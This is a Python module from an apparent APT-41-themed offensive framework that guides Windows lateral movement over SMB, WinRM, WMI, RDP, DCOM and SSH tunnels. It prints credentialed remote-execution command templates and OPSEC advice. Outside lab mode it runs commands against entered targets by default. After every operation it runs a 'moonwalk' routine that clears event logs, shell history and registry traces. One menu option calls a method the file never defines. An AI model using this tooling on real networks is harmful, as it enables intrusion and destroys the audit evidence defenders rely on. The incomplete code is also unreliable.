"""Lateral Movement Channels Module"""

from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from rich.console import Console
from modules.utils import execute_command, execute_powershell, execute_cmd, validate_target
from modules.loghunter_integration import WindowsMoonwalk


class LateralModule:
    """Module for lateral movement channels"""
    
    def __init__(self):
        self.moonwalk = None
    
    def run(self, console: Console, session_data: dict):
        if not self.moonwalk:
            self.moonwalk = WindowsMoonwalk(console, session_data)
        """Run lateral movement module"""
        while True:
            console.print(Panel(
                "[bold]Lateral Movement Channels[/bold]\n\n"
                "Execute lateral movement using SMB/RPC, WinRM, WMI, and RDP.\n"
                "[dim]Moonwalk: Auto-clearing logs and traces after each operation[/dim]",
                title="Module 4",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
            table.add_column("Option", style="cyan", width=3)
            table.add_column("Function", style="white")
            
            table.add_row("1", "SMB/RPC-based Movement [APT-41: Lateral Movement]")
            table.add_row("2", "WinRM / PowerShell Remoting [APT-41: Lateral Movement]")
            table.add_row("3", "WMI-based Execution [APT-41: Lateral Movement]")
            table.add_row("4", "RDP-based Pivoting [APT-41: Lateral Movement]")
            table.add_row("5", "DCOM / COM-based Movement [APT-41: Lateral Movement]")
            table.add_row("6", "SSH Tunneling & Port Forwarding [APT-41: Command and Control]")
            table.add_row("7", "APT-41 Custom Tools & Techniques")
            table.add_row("?", "Module Guide - Usage instructions and TTPs")
            table.add_row("0", "Return to main menu")
            
            console.print(table)
            console.print()
            
            choice = Prompt.ask("Select function", choices=['0', '1', '2', '3', '4', '5', '6', '7', '?'], default='0')
            
            if choice == '0':
                break
            elif choice == '?':
                self._show_guide(console)
            elif choice == '1':
                self._smb_rpc(console, session_data)
            elif choice == '2':
                self._winrm_psremoting(console, session_data)
            elif choice == '3':
                self._wmi_execution(console, session_data)
            elif choice == '4':
                self._rdp_pivoting(console, session_data)
            elif choice == '5':
                self._dcom_com(console, session_data)
            elif choice == '6':
                self._ssh_tunneling(console, session_data)
            elif choice == '7':
                self._apt41_lateral_tools(console, session_data)
            
            # Moonwalk cleanup after lateral movement operations (enabled by default)
            if choice != '0':
                self._moonwalk_cleanup(console, 'lateral_movement')
            
            console.print()
    
    def _show_guide(self, console: Console):
        """Show module guide"""
        guide_text = """[bold cyan]Lateral Movement Channels Module Guide[/bold cyan]

[bold]Purpose:[/bold]
Execute lateral movement using SMB/RPC, WinRM, WMI, and RDP.

[bold]Key Functions:[/bold]
1. SMB/RPC Movement - Use PsExec, WMIExec, or custom tools
2. WinRM/PowerShell Remoting - Remote PowerShell execution
3. WMI Execution - Windows Management Instrumentation
4. RDP Pivoting - Remote Desktop Protocol tunneling
5. DCOM/COM Movement - Distributed COM execution
6. SSH Tunneling - Port forwarding and tunneling
7. APT-41 Custom Tools - Specialized lateral movement tools

[bold]MITRE ATT&CK TTPs:[/bold]
• T1021 - Remote Services
• T1072 - Software Deployment Tools
• T1105 - Ingress Tool Transfer
• T1570 - Lateral Tool Transfer
• T1021.001 - Remote Desktop Protocol
• T1021.002 - SMB/Windows Admin Shares
• T1021.003 - Distributed Component Object Model

[bold]Usage Tips:[/bold]
• Option 1 (SMB/RPC) is most common and reliable
• Option 2 (WinRM) requires PowerShell remoting enabled
• Option 3 (WMI) is stealthy but slower
• Option 4 (RDP) provides interactive access
• Use credentials from Identity module for authentication
• Moonwalk automatically clears lateral movement traces

[bold]Best Practices:[/bold]
• Use valid credentials from credential harvesting
• Prefer native Windows tools (living off the land)
• Test connectivity before attempting movement
• Clear traces after each lateral movement operation"""
        
        console.print(Panel(guide_text, title="Module Guide", border_style="cyan"))
        console.print()
        Prompt.ask("[dim]Press Enter to continue[/dim]", default="")
    
    def _moonwalk_cleanup(self, console: Console, operation_type: str):
        """Perform moonwalk cleanup after operation"""
        try:
            console.print("\n[yellow]Running moonwalk cleanup...[/yellow]")
            results = self.moonwalk.cleanup_after_operation(operation_type)
            
            if results.get('event_logs', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['event_logs']['cleared'])} event logs[/green]")
            if results.get('powershell_history'):
                console.print("[green]Cleared PowerShell history[/green]")
            if results.get('command_history'):
                console.print("[green]Cleared command history[/green]")
            if results.get('registry_traces', {}).get('cleared'):
                console.print(f"[green]Cleared {len(results['registry_traces']['cleared'])} registry traces[/green]")
        except Exception as e:
            console.print(f"[yellow]Moonwalk cleanup error: {e}[/yellow]")
    
    def _smb_rpc(self, console: Console, session_data: dict):
        """SMB/RPC-based lateral movement"""
        console.print("\n[bold cyan]SMB/RPC-based Lateral Movement[/bold cyan]")
        console.print("[dim]TTP: T1021.002 (SMB/Windows Admin Shares), T1569.002 (Service Execution), T1570 (Lateral Tool Transfer)[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]Administrative Share Access:[/bold]")
        smb_cmds = [
            "net use \\\\<target>\\C$ /user:<domain>\\<user> <password>",
            "net use \\\\<target>\\C$ /user:<domain>\\<user> * (prompt for password)",
            "net use \\\\<target>\\ADMIN$ /user:<domain>\\<user> <password>",
            "Copy-Item -Path <local> -Destination \\\\<target>\\C$\\<path> -Credential <cred>"
        ]
        
        for cmd in smb_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Service Management:[/bold]")
        service_cmds = [
            "sc \\\\<target> create <service> binPath= \"<command>\"",
            "sc \\\\<target> start <service>",
            "sc \\\\<target> stop <service>",
            "sc \\\\<target> delete <service>"
        ]
        
        for cmd in service_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Process Creation:[/bold]")
        process_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process call create \"<command>\"",
            "psexec.exe \\\\<target> -u <user> -p <pass> <command>",
            "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList <command> -ComputerName <target> -Credential <cred>"
        ]
        
        for cmd in process_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Scheduled Task:[/bold]")
        task_cmds = [
            "schtasks /create /s <target> /u <user> /p <pass> /tn <task> /tr \"<command>\" /sc onstart",
            "schtasks /run /s <target> /u <user> /p <pass> /tn <task>",
            "schtasks /delete /s <target> /u <user> /p <pass> /tn <task> /f"
        ]
        
        for cmd in task_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1021.002: Access remote systems via SMB admin shares (C$, ADMIN$, IPC$)")
        console.print("  • T1569.002: Create/start services remotely for execution")
        console.print("  • T1570: Transfer tools/payloads over SMB before execution")
        console.print("  • T1053.005: Use scheduled tasks for remote execution")
        
        console.print("\n[bold]Common Patterns:[/bold]")
        patterns = [
            "Copy tool to C$ share → Execute via service/task",
            "Use PsExec-style execution via service creation",
            "Transfer credentials/tools over SMB",
            "Use built-in Windows binaries (sc, wmic, schtasks)"
        ]
        
        for pattern in patterns:
            console.print(f"  • [yellow]{pattern}[/yellow]")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • Use built-in Windows binaries (sc, wmic, schtasks)")
        console.print("  • Prefer service creation over direct process execution")
        console.print("  • Clean up artifacts after execution")
        console.print("  • Use legitimate admin tools to blend in")
        
        if is_live or Confirm.ask("\n[bold]Execute SMB/RPC command?[/bold]", default=False):
            target = Prompt.ask("Target hostname or IP")
            valid, error = validate_target(target, lab_use)
            if not valid:
                console.print(f"[bold red]{error}[/bold red]")
                return
            
            action = Prompt.ask("Action", choices=["test_share", "list_shares", "copy_file", "create_service"], default="test_share")
            
            if action == "test_share":
                cmd = f"net use \\\\{target}\\C$"
                console.print(f"\n[yellow]Executing:[/yellow] {cmd}\n")
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
                if exit_code == 0:
                    console.print(f"[green]Success:[/green] {stdout}")
                else:
                    console.print(f"[red]Error:[/red] {stderr}")
            
            elif action == "list_shares":
                cmd = f"net view \\\\{target}"
                console.print(f"\n[yellow]Executing:[/yellow] {cmd}\n")
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=lab_use)
                if exit_code == 0:
                    console.print(f"[green]Shares:[/green]\n{stdout}")
                else:
                    console.print(f"[red]Error:[/red] {stderr}")
    
    def _winrm_psremoting(self, console: Console, session_data: dict):
        """WinRM / PowerShell Remoting"""
        console.print("\n[bold cyan]WinRM / PowerShell Remoting[/bold cyan]")
        console.print("[dim]TTP: T1021.006 (Windows Remote Management), T1059.001 (PowerShell), T1570 (Lateral Tool Transfer)[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]WinRM Configuration Check:[/bold]")
        config_cmds = [
            "winrm get winrm/config",
            "winrm enumerate winrm/config/listener",
            "Test-WSMan -ComputerName <target>"
        ]
        
        for cmd in config_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]PowerShell Remoting:[/bold]")
        ps_cmds = [
            "Enter-PSSession -ComputerName <target> -Credential <cred>",
            "Invoke-Command -ComputerName <target> -Credential <cred> -ScriptBlock { <command> }",
            "Invoke-Command -ComputerName <target> -Credential <cred> -FilePath <script.ps1>",
            "$sess = New-PSSession -ComputerName <target> -Credential <cred>; Invoke-Command -Session $sess -ScriptBlock { <command> }"
        ]
        
        for cmd in ps_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WinRS (WinRM Command Line):[/bold]")
        winrs_cmds = [
            "winrs -r:<target> -u:<user> -p:<pass> <command>",
            "winrs -r:<target> -u:<user> -p:<pass> cmd.exe"
        ]
        
        for cmd in winrs_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Enable WinRM Remotely:[/bold]")
        enable_cmds = [
            "winrm quickconfig -force (local)",
            "Enable-PSRemoting -Force (local)",
            "Invoke-Command -ComputerName <target> -ScriptBlock { Enable-PSRemoting -Force }"
        ]
        
        for cmd in enable_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1021.006: Use WinRM for remote PowerShell sessions")
        console.print("  • T1059.001: Execute PowerShell commands/scripts remotely")
        console.print("  • T1570: Transfer tools/scripts via WinRM before execution")
        console.print("  • Authenticate with T1078 (Valid Accounts) or T1550 (Alternate Auth)")
        
        console.print("\n[bold]PowerShell Remoting Patterns:[/bold]")
        ps_patterns = [
            "Execute PowerShell scripts from memory",
            "Use Invoke-Command for remote execution",
            "Leverage existing PowerShell remoting sessions",
            "Execute base64-encoded commands",
            "Use legitimate PowerShell modules"
        ]
        
        for pattern in ps_patterns:
            console.print(f"  • [yellow]{pattern}[/yellow]")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • WinRM uses HTTPS (5986) by default - encrypted")
        console.print("  • Resembles legitimate admin automation")
        console.print("  • Can execute scripts without dropping files")
        console.print("  • PowerShell extensively used for lateral movement")
        
        if is_live or Confirm.ask("\n[bold]Test WinRM connectivity?[/bold]", default=False):
            target = Prompt.ask("Target hostname or IP")
            valid, error = validate_target(target, lab_use)
            if not valid:
                console.print(f"[bold red]{error}[/bold red]")
                return
            
            ps_cmd = f"Test-WSMan -ComputerName {target}"
            console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]WinRM available:[/green]\n{stdout}")
            else:
                console.print(f"[red]WinRM not available or error:[/red] {stderr}")
            
            if Confirm.ask("\n[bold]Execute remote command?[/bold]", default=False):
                remote_cmd = Prompt.ask("Command to execute", default="whoami")
                ps_cmd = f"Invoke-Command -ComputerName {target} -ScriptBlock {{ {remote_cmd} }}"
                console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
                if exit_code == 0:
                    console.print(f"[green]Output:[/green]\n{stdout}")
                else:
                    console.print(f"[red]Error:[/red] {stderr}")
    
    def _wmi_execution(self, console: Console, session_data: dict):
        """WMI-based execution"""
        console.print("\n[bold cyan]WMI-based Execution[/bold cyan]")
        console.print("[dim]TTP: T1047 (Windows Management Instrumentation), T1018 (Remote System Discovery)[/dim]\n")
        
        lab_use = session_data.get('LAB_USE', 0)
        is_live = lab_use != 1
        
        console.print("[bold]WMI Query:[/bold]")
        query_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process list",
            "wmic /node:<target> /user:<user> /password:<pass> service list",
            "wmic /node:<target> /user:<user> /password:<pass> os get name",
            "Get-WmiObject -Class Win32_Process -ComputerName <target> -Credential <cred>"
        ]
        
        for cmd in query_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WMI Process Creation:[/bold]")
        wmi_exec_cmds = [
            "wmic /node:<target> /user:<user> /password:<pass> process call create \"<command>\"",
            "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList <command> -ComputerName <target> -Credential <cred>",
            "[PowerShell] $proc = [WmiClass]\"\\\\<target>\\root\\cimv2:Win32_Process\"; $proc.Create(\"<command>\")"
        ]
        
        for cmd in wmi_exec_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]WMI Event Subscription (Persistence):[/bold]")
        wmi_event_cmds = [
            "Get-WmiObject -Class __EventFilter -Namespace root\\subscription",
            "Get-WmiObject -Class __EventConsumer -Namespace root\\subscription",
            "Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\\subscription"
        ]
        
        for cmd in wmi_event_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1047: Execute commands via WMI remotely")
        console.print("  • T1018: Use WMI for remote system discovery")
        console.print("  • T1053.003: WMI event subscriptions for persistence")
        console.print("  • Operates over RPC (135) and dynamic ports")
        
        console.print("\n[bold]WMI Usage Patterns:[/bold]")
        wmi_patterns = [
            "Remote process creation via Win32_Process",
            "System inventory and discovery",
            "WMI event subscriptions for persistence",
            "Query system information remotely",
            "Living off the land execution"
        ]
        
        for pattern in wmi_patterns:
            console.print(f"  • [yellow]{pattern}[/yellow]")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • WMI operates over ports commonly allowed for management")
        console.print("  • Useful for inventorying hosts remotely")
        console.print("  • Can be used where other remoting mechanisms unavailable")
        console.print("  • Uses legitimate Windows management protocols")
        
        if is_live or Confirm.ask("\n[bold]Execute WMI query?[/bold]", default=False):
            target = Prompt.ask("Target hostname or IP")
            valid, error = validate_target(target, lab_use)
            if not valid:
                console.print(f"[bold red]{error}[/bold red]")
                return
            
            query_type = Prompt.ask("Query type", choices=["process", "service", "os"], default="process")
            
            if query_type == "process":
                ps_cmd = f"Get-WmiObject -Class Win32_Process -ComputerName {target} | Select-Object -First 10 ProcessName, ProcessId, CommandLine"
            elif query_type == "service":
                ps_cmd = f"Get-WmiObject -Class Win32_Service -ComputerName {target} | Select-Object -First 10 Name, State, StartName"
            else:
                ps_cmd = f"Get-WmiObject -Class Win32_OperatingSystem -ComputerName {target} | Select-Object Name, Version, TotalVisibleMemorySize"
            
            console.print(f"\n[yellow]Executing:[/yellow] {ps_cmd}\n")
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=lab_use)
            if exit_code == 0:
                console.print(f"[green]WMI Query Result:[/green]\n{stdout}")
            else:
                console.print(f"[red]Error:[/red] {stderr}")
    
    def _rdp_pivoting(self, console: Console, session_data: dict):
        """RDP-based pivoting"""
        console.print("\n[bold cyan]RDP-based Pivoting[/bold cyan]")
        console.print("[dim]TTP: T1021.001 (Remote Desktop Protocol)[/dim]\n")
        
        console.print("[bold]RDP Connection:[/bold]")
        rdp_cmds = [
            "mstsc /v:<target> /admin",
            "mstsc /v:<target> /f",
            "xfreerdp /u:<user> /p:<pass> /v:<target>",
            "rdesktop -u <user> -p <pass> <target>"
        ]
        
        for cmd in rdp_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]RDP via SSH Tunnel:[/bold]")
        tunnel_cmds = [
            "ssh -L 3389:<target>:3389 user@<ssh_host>",
            "Then connect: mstsc /v:localhost",
            "[PowerShell] New-SSHLocalPortForward -LocalPort 3389 -RemoteHost <target> -RemotePort 3389"
        ]
        
        for cmd in tunnel_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]RDP Session Enumeration:[/bold]")
        enum_cmds = [
            "qwinsta /server:<target>",
            "query session /server:<target>",
            "quser /server:<target>"
        ]
        
        for cmd in enum_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Use Cases:[/bold]")
        use_cases = [
            "Access tools only exposed via GUI",
            "Interact with legacy admin consoles",
            "Use MMC snap-ins remotely",
            "Access jump hosts, DCs, management servers"
        ]
        
        for case in use_cases:
            console.print(f"  • {case}")
        
        console.print("\n[bold]TTP Context:[/bold]")
        console.print("  • T1021.001: Use RDP for interactive remote access")
        console.print("  • Authenticate with T1078 (Valid Accounts) or T1550 (Alternate Auth)")
        console.print("  • Useful for GUI-based tools and MMC snap-ins")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • RDP sessions are visible in event logs")
        console.print("  • Use short-lived, tightly scoped sessions")
        console.print("  • Prefer SSH tunnel for RDP when possible")
        console.print("  • Consider WinRM/PowerShell for non-interactive tasks")
    
    def _dcom_com(self, console: Console, session_data: dict):
        """DCOM / COM-based movement"""
        console.print("\n[bold cyan]DCOM / COM-based Movement[/bold cyan]\n")
        
        console.print("[bold]DCOM Execution:[/bold]")
        dcom_cmds = [
            "[PowerShell] $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<target>\")); $dcom.Document.ActiveView.ExecuteShellCommand(\"<command>\", $null, $null, 7)",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method MMC20.Application -Command <command>",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellWindows -Command <command>",
            "[PowerShell] Invoke-DCOM -ComputerName <target> -Method ShellBrowserWindow -Command <command>"
        ]
        
        for cmd in dcom_cmds:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]COM Objects:[/bold]")
        com_info = [
            "MMC20.Application - ExecuteShellCommand method",
            "ShellWindows - ShellExecute method",
            "ShellBrowserWindow - ShellExecute method",
            "Excel.Application - Run method",
            "Outlook.Application - CreateObject method"
        ]
        
        for info in com_info:
            console.print(f"  • {info}")
        
        console.print("\n[bold]OPSEC Considerations:[/bold]")
        console.print("  • DCOM uses RPC (135) and dynamic ports")
        console.print("  • Less commonly monitored than SMB/WinRM")
        console.print("  • Requires appropriate COM permissions")
    
    def _ssh_tunneling(self, console: Console, session_data: dict):
        """SSH tunneling and port forwarding"""
        console.print("\n[bold cyan]SSH Tunneling & Port Forwarding[/bold cyan]")
        console.print("[dim]TTP: T1021.004 (SSH), T1570 (Lateral Tool Transfer), T1071 (Application Layer Protocol)[/dim]\n")
        
        console.print("[bold]Local Port Forwarding:[/bold]")
        local_fwd = [
            "ssh -L <local_port>:<remote_host>:<remote_port> user@<ssh_host>",
            "ssh -L 3389:internal-dc:3389 user@jump-host",
            "ssh -L 5985:target:5985 user@jump-host",
            "[PowerShell] New-SSHLocalPortForward -LocalPort <port> -RemoteHost <host> -RemotePort <port>"
        ]
        
        for cmd in local_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Remote Port Forwarding:[/bold]")
        remote_fwd = [
            "ssh -R <remote_port>:<local_host>:<local_port> user@<ssh_host>",
            "ssh -R 8080:localhost:80 user@target",
            "Enables reverse connections"
        ]
        
        for cmd in remote_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Dynamic Port Forwarding (SOCKS):[/bold]")
        dynamic_fwd = [
            "ssh -D <local_port> user@<ssh_host>",
            "ssh -D 1080 user@jump-host",
            "Configure proxy: localhost:1080",
            "Use with proxychains, etc."
        ]
        
        for cmd in dynamic_fwd:
            console.print(f"  • {cmd}")
        
        console.print("\n[bold]Use Cases:[/bold]")
        use_cases = [
            "Access internal services through jump host",
            "Bypass network segmentation",
            "Create encrypted tunnels for lateral movement",
            "Access RDP/WinRM on internal hosts"
        ]
        
        for case in use_cases:
            console.print(f"  • {case}")
